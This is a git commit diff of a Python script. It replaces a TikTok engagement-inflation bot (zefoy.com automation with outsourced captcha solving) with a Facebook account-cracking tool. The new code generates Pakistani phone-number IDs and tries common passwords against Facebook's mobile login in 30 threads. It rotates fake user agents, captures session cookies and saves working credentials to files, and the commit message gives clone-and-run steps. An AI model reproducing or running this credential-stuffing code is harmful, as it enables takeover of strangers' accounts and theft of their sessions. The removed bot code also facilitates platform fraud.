f3d9e0129ae1c1394bbfa6f55d998d4e4fd40a9b
rashidshar100 <rashidshar100@gmail.com>
2024-08-02 14:23:40 +0500

    Update v2.py
    git clone https://github.com/rashidshar100/Rashid100.git
    cd Rashid100
    python v2.py

--- v2.py
+++ v2.py
@@ -1,221 +1,212 @@
-# I used tekky's script because I was too lazy to do it, it's just a simple script.
-
-from time import sleep
+#___Created By Rashid Sindhi Shar _______#
+#_____I love You jana M 🤣😅___________#
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
 from datetime import datetime
-from os import system, name as os_name
-from base64 import b64encode
-from io import BytesIO
-from requests import get, post, Session
-from re import findall
-from selenium import webdriver
-from colorama import Fore, init, Style
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.chrome.webdriver import WebDriver
-from selenium.webdriver.common.by import By
-
-
-text = """
- ███████ ███████ ███████  ██████  ██    ██ 
-    ███  ██      ██      ██    ██  ██  ██  
-   ███   █████   █████   ██    ██   ████   
-  ███    ██      ██      ██    ██    ██    
- ███████ ███████ ██       ██████     ██    """
-
-class Zefoy:
-    def __init__(self) -> None:
-        self.captcha_box = '/html/body/div[5]/div[2]/form/div/div'
-        self.driver = self.setup_browser()
-        self.sent = 0
-        self.option = None
-        self.clear = system('cls' if os_name == 'nt' else 'clear')
-        self.captcha_box = '/html/body/div[5]/div[2]/form/div/div'
-
-        self.xpaths = {
-            "followers"     : "/html/body/div[6]/div/div[2]/div/div/div[2]/div/button",
-            "hearts"        : "/html/body/div[6]/div/div[2]/div/div/div[3]/div/button",
-            "comment_hearts": "/html/body/div[6]/div/div[2]/div/div/div[4]/div/button",
-            "views"         : "/html/body/div[6]/div/div[2]/div/div/div[5]/div/button",
-            "shares"        : "/html/body/div[6]/div/div[2]/div/div/div[6]/div/button",
-            "favorites"     : "/html/body/div[6]/div/div[2]/div/div/div[7]/div/button",
-        }
-
-        self.tasks = {
-            1: (('self.driver.find_element(By.XPATH, self.xpaths["followers"]).click()', "7"), "c2VuZF9mb2xsb3dlcnNfdGlrdG9r"),
-            2: (('self.driver.find_element(By.XPATH, self.xpaths["hearts"]).click()', "8"), "c2VuZE9nb2xsb3dlcnNfdGlrdG9r"),
-            3: (('self.driver.find_element(By.XPATH, self.xpaths["comment_hearts"]).click()', "9"), "c2VuZC9mb2xsb3dlcnNfdGlrdG9r"),
-            4: (('self.driver.find_element(By.XPATH, self.xpaths["views"]).click()', "10"), "c2VuZC9mb2xeb3dlcnNfdGlrdG9V"),
-            5: (('self.driver.find_element(By.XPATH, self.xpaths["shares"]).click()', "11"), "c2VuZC9mb2xsb3dlcnNfdGlrdG9s"),
-            6: (('self.driver.find_element(By.XPATH, self.xpaths["favorites"]).click()', "12"), "c2VuZF9mb2xsb3dlcnNfdGlrdG9L")
-        }
-
-    def setup_browser(self) -> WebDriver:
-        options = Options()
-        options.add_experimental_option("detach", True)
-        options.add_experimental_option("excludeSwitches", ["enable-logging"])
-
-        return webdriver.Chrome(options=options, service=Service(ChromeDriverManager().install()))
-    
-    def solve(debug) -> dict:
-
-        session = Session()
-        session.headers = {
-                'authority': 'zefoy.com',
-                'origin': 'https://zefoy.com',
-                'authority': 'zefoy.com',
-                'cp-extension-installed': 'Yes',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-            }
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+#_________country Proxy ____Rashid_____#
+try:
+    proxx=requests.get("https://api.proxyscrape.com/v2/account/datacenter_shared/whitelist?auth=nhuyjukilompnbvfrtyuui&type=set&ip[]=10.74.182.36&ip[]=10.74.182.36").text
+except:
+    print(" [✓] INTERNET CONNECTION ERROR")
+    sys.exit()
+    #_______user agent _____#
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
         
-        while True:
-            source_code = str(session.get('https://zefoy.com').text).replace('&amp;', '&')
-            captcha_token = findall(r'<input type="hidden" name="(.*)">', source_code)
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+#__________Logo_____Rashid_____#
+logo = ("""
+\033[1;32m  _____           _     _     _ 
+  |  __ \         | |   (_)   | |
+  | |__) |__ _ ___| |__  _  __| |
+  |  _  // _` / __| '_ \| |/ _` |
+  | | \ \ (_| \__ \ | | | | (_| |
+  |_|  \_\__,_|___/_| |_|_|\__,_|
+[+]=================================
+[+] CREATED BY   :  RASHID
+[+] COUNTRY      :  PAKISTAN
+[+] ON GITHUB    :  RASHID
+[+] TOOL STATUS  :  RANDOM
+[+] TOOL VERSION : .0.1
+[+]===============================""")
+  #_________Mthad________#
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊")
+        print(" [0] 𝐄𝐗𝐈𝐓")
+        RashidSindhi =input("\n [?] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
+        if RashidSindhi in ["1","01"]:
+            fuck()
+        if RashidSindhi in [" 0", "00"]:
+            exit()
+        else:
+            exit()
             
-            if 'token' in captcha_token:
-                captcha_token.remove('token')
-                
-            captcha_url    = findall(r'img src="([^"]*)"', source_code)[0]
-            token_answer = findall(r'type="text" name="(.*)" oninput="this.value', source_code)[0]
-            encoded_image = b64encode(BytesIO(session.get('https://zefoy.com' + captcha_url).content).read()).decode('utf-8')
-            captcha_answer = post(f"https://platipus9999.pythonanywhere.com/", json={'captcha': encoded_image, 'current_time': datetime.now().strftime("%H:%M:%S")}).json()["result"]
-            
-            sleep(1)
-
-            data = {
-                token_answer: captcha_answer,
-            }
-
-            for values in captcha_token:
-                token, value = values.split('" value="')
-                data[token] = value
-            else:
-                data['token'] = ''
-
-            response = session.post('https://zefoy.com', data = data).text
-            try:
-                findall(r'remove-spaces" name="(.*)" placeholder', response)[0]
-                return {'name':'PHPSESSID', 'value': session.cookies.get('PHPSESSID')}
-            except:
-                pass
-
-    def send_bot(self, search_button, url_box, vid_info, div):
-        element = self.driver.find_element(By.XPATH, url_box)
-        element.clear()
-        element.send_keys(vid_info)
-        self.driver.find_element(By.XPATH, search_button).click()
-        sleep(3)
-            
-        ratelimit_seconds, full = self.check_submit()
-        if "(s)" in str(full):
-            self.main_sleep(ratelimit_seconds)
-            self.driver.find_element(By.XPATH, search_button).click()
-            sleep(2)
-            
-        sleep(3)
-            
-        send_button = f'/html/body/div[{div}]/div/div/div[1]/div/form/button'
-        self.driver.find_element(By.XPATH, send_button).click()
-        self.sent += 1
-        print(self._print(f"Sent {self.sent} times."))
-            
-        sleep(4)
-        self.send_bot(search_button, url_box, vid_info, div)
-
-    def main_sleep(self, delay):
-        while delay != 0:
-            sleep(1)
-            delay -= 1
-            self.change_title(f"TikTok Zefoy Automator using Zefoy.com / Cooldown: {delay}s / Github: @useragents")
-
-    def convert(self, min: int, sec: int) -> int:
-            return min * 60 + sec + 4 if min != 0 else sec + 4
-
-    def check_submit(self):
-        remaining = f'//*[@id="{self.tasks[self.option][1]}"]/span'
-            
-        try:
-            element = self.driver.find_element(By.XPATH, remaining)
-        except:
-            return None, None
-            
-        if "READY" in element.text:
-            return True, True
-            
-        if "seconds for your next submit" in element.text:
-            output          = element.text.split("Please wait ")[1].split(" for")[0]
-            minutes         = element.text.split("Please wait ")[1].split(" ")[0]
-            seconds         = element.text.split("(s) ")[1].split(" ")[0]
-            sleep_duration  = self.convert(int(minutes), int(seconds))
-                
-            return sleep_duration, output
-            
-        return element.text, None
-            
-    def check_status(self):
-        statuses = {}
-            
-        for thing in self.xpaths:
-            value = self.xpaths[thing]
-            element = self.driver.find_element(By.XPATH, value)
-                
-            if not element.is_enabled():
-                statuses.update({thing: f"{Fore.RED}[OFFLINE]"})
-                
-            else:
-                statuses.update({thing: f"{Fore.GREEN}[WORKS]"})
-            
-        return statuses
-
-    def _print(self, msg, status = "-"):
-        return f" {Fore.WHITE}[{Fore.CYAN}{status}{Fore.WHITE}] {msg}"
-
-    def change_title(self, arg):
-        system(f'title {arg}' if os_name == 'nt' else '')
-
-    def wait_for_xpath(self, xpath):
-        while True:
-            try:
-                self.driver.find_element(By.XPATH, xpath)
+def fuck():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 𝐂𝐎𝐃𝐄: 0306, 0307, 0308, 0300, 0320, 0315, 0342 ')
+    code = input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐃𝐄 : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄: 1000 2000 3000 5000 10000 ')
+    limit = int(input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as RASHID:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃: '+tl)
+        print("[+] 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄: "+code)
+        print('[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃  »»» 𝐕.0.01')
+        print('==================================================')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,"pakistan","janjan","king123","kingkhan","malik123","baloch123","khankhan","khankhan","khan1122"]
+            RASHID.submit(RashidSindhi2,uid,pwx,tl)
+    print('==================================================')
+    print(' [+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
+    print(' [+] OK Ids saved in RASHID/OK.txt')
+    print(' [+] CP Ids saved in RASHID/CP.txt')
+    print('==================================================')
+def RashidSindhi2(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;92m[RASHID]--[%s/%s]--[𝐎𝐊-%s]~[𝐂𝐏-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+            'scheme':'https',
+       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '3',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"CPH1819"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[1;92m[RASHID-OK] {uid}|{ps} \nCookie : {coki}")
+                open('/sdcard/RASHID/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
                 break
-            except:
-                pass
-
-            
-    def main(self):
-        self.clear
-        print(Fore.CYAN + text+ "\n") 
-        self.driver.get("https://zefoy.com")
-
-        print(self._print("Solving The Captcha"))
-        self.driver.add_cookie(self.solve())
-        self.driver.refresh()
-
-        self.wait_for_xpath(self.xpaths["views"])
-
-        self.clear
-
-        status = self.check_status()
-            
-        print('\n')
-            
-        counter = 1
-        for thing in status:
-            print(self._print(f"{thing} {status[thing]}", counter))
-            counter += 1
-
-        self.option = int(input("\n" + self._print(f"")))
-        video_url     = input("\n" + self._print(f"Username/VideoURL: "))    
-
-        task, div = self.tasks[self.option][0]; eval(task)
-               
-        video_url_box = f'/html/body/div[{div}]/div/form/div/input'
-        search_box    = f'/html/body/div[{div}]/div/form/div/div/button'
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                open('/sdcard/RASHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
         
-            
-        self.send_bot(search_box, video_url_box, video_url, div)
-
-
-
-if __name__ == "__main__":
-    Zefoy().main()
+Main()
